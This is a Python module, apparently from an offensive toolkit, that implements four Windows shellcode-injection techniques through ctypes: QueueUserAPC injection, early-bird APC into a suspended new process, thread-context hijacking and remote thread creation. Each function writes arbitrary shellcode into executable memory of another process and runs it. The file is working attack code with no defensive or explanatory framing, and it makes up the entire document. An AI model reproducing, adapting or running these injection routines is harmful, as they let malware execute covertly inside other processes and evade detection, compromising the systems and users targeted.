import os

if os.name == 'nt':
    import ctypes
    from ctypes import wintypes
    k32, ntdll, u32 = ctypes.windll.kernel32, ctypes.windll.ntdll, ctypes.windll.user32
    _TE32 = type('_TE32', (ctypes.Structure,), {'_fields_': [
        ('dwSize', wintypes.DWORD), ('cntUsage', wintypes.DWORD),
        ('th32ThreadID', wintypes.DWORD), ('th32OwnerProcessID', wintypes.DWORD),
        ('tpBasePri', wintypes.LONG), ('tpDeltaPri', wintypes.LONG),
        ('dwFlags', wintypes.DWORD)]})
    _PI = type('_PI', (ctypes.Structure,), {'_fields_': [
        ('hProcess', wintypes.HANDLE), ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD), ('dwThreadId', wintypes.DWORD)]})

    def _threads(pid):
        ids, te = [], _TE32()
        te.dwSize = ctypes.sizeof(_TE32)
        snap = k32.CreateToolhelp32Snapshot(0x00000004, 0)
        if snap == -1:
            return ids
        ok = k32.Thread32First(snap, ctypes.byref(te))
        while ok:
            if te.th32OwnerProcessID == pid:
                ids.append(te.th32ThreadID)
            ok = k32.Thread32Next(snap, ctypes.byref(te))
        k32.CloseHandle(snap)
        return ids


def queue_user_apc(shellcode: bytes, pid: int) -> str:
    if os.name != 'nt':
        return '[-] APC injection is Windows-only'
    sc, pid = bytes(shellcode), int(pid)
    h = k32.OpenProcess(0x001F0FFF, False, pid)
    if not h:
        return f'[-] OpenProcess failed on PID {pid}'
    a = k32.VirtualAllocEx(h, None, len(sc), 0x3000, 0x40)
    if not a:
        k32.CloseHandle(h)
        return '[-] VirtualAllocEx failed'
    w = ctypes.c_size_t(0)
    k32.WriteProcessMemory(h, a, sc, len(sc), ctypes.byref(w))
    for tid in _threads(pid):
        ht = k32.OpenThread(0x001F03FF, False, tid)
        if ht:
            k32.QueueUserAPC(ctypes.c_void_p(a), ht, 1)
            k32.CloseHandle(ht)
    k32.CloseHandle(h)
    return f'[+] APC queued to threads in PID {pid}'


def early_bird_apc(shellcode: bytes, target_exe: str) -> str:
    if os.name != 'nt':
        return '[-] Early bird APC is Windows-only'
    sc, target = bytes(shellcode), str(target_exe)
    si = (ctypes.c_byte * 104)()
    ctypes.cast(si, wintypes.LPDWORD).contents.value = 104
    pi = _PI()
    if not k32.CreateProcessW(None, target, None, None, False,
                                0x00000004, None, None, si, ctypes.byref(pi)):
        return f'[-] CreateProcess failed: {ctypes.get_last_error()}'
    a = k32.VirtualAllocEx(pi.hProcess, None, len(sc), 0x3000, 0x40)
    if not a:
        k32.TerminateProcess(pi.hProcess, 0)
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        return '[-] VirtualAllocEx failed'
    w = ctypes.c_size_t(0)
    k32.WriteProcessMemory(pi.hProcess, a, sc, len(sc), ctypes.byref(w))
    k32.QueueUserAPC(a, pi.hThread, 0)
    k32.ResumeThread(pi.hThread)
    k32.CloseHandle(pi.hProcess)
    k32.CloseHandle(pi.hThread)
    return f'[+] Early bird APC injected into {target}'


def set_thread_context(shellcode: bytes, pid: int) -> str:
    if os.name != 'nt':
        return '[-] Thread context hijack is Windows-only'
    sc, pid = bytes(shellcode), int(pid)
    is64 = ctypes.sizeof(ctypes.c_void_p) == 8
    sz, off = (1232, 80) if is64 else (716, 45)
    threads = _threads(pid)
    if not threads:
        return f'[-] No threads found in PID {pid}'
    for tid in threads:
        ht = k32.OpenThread(0x001F03FF, False, tid)
        if not ht:
            continue
        hp = None
        try:
            k32.SuspendThread(ht)
            hp = k32.OpenProcess(0x0048, False, pid)
            if not hp:
                continue
            a = k32.VirtualAllocEx(hp, None, len(sc), 0x3000, 0x40)
            if not a:
                continue
            w = ctypes.c_size_t(0)
            k32.WriteProcessMemory(hp, a, sc, len(sc), ctypes.byref(w))
            ctx = (wintypes.DWORD * sz)()
            ctx[0] = 0x10007
            if k32.GetThreadContext(ht, ctx):
                ctx[off] = a
                k32.SetThreadContext(ht, ctx)
                return f'[+] Thread context hijacked in PID {pid} (TID {tid})'
        finally:
            k32.ResumeThread(ht)
            k32.CloseHandle(ht)
            if hp:
                k32.CloseHandle(hp)
    return f'[-] No suitable thread in PID {pid}'


def remote_thread_hijack(shellcode: bytes, pid: int) -> str:
    if os.name != 'nt':
        return '[-] Thread hijack is Windows-only'
    sc, pid = bytes(shellcode), int(pid)
    threads = _threads(pid)
    if not threads:
        return f'[-] No threads found in PID {pid}'
    for tid in threads:
        ht = k32.OpenThread(0x001F03FF, False, tid)
        if not ht:
            continue
        k32.SuspendThread(ht)
        if k32.ResumeThread(ht) == 0:
            k32.CloseHandle(ht)
            continue
        k32.SuspendThread(ht)
        hp = None
        try:
            hp = k32.OpenProcess(0x0048, False, pid)
            if not hp:
                continue
            a = k32.VirtualAllocEx(hp, None, len(sc), 0x3000, 0x40)
            if not a:
                continue
            w = ctypes.c_size_t(0)
            k32.WriteProcessMemory(hp, a, sc, len(sc), ctypes.byref(w))
            hr = k32.CreateRemoteThread(hp, None, 0, a, None, 0, None)
            if hr:
                k32.WaitForSingleObject(hr, 0xFFFFFFFF)
                k32.CloseHandle(hr)
            return f'[+] Thread hijacked in PID {pid} (TID {tid})'
        finally:
            k32.ResumeThread(ht)
            k32.CloseHandle(ht)
            if hp:
                k32.CloseHandle(hp)
    return f'[-] No suspended thread found in PID {pid}'
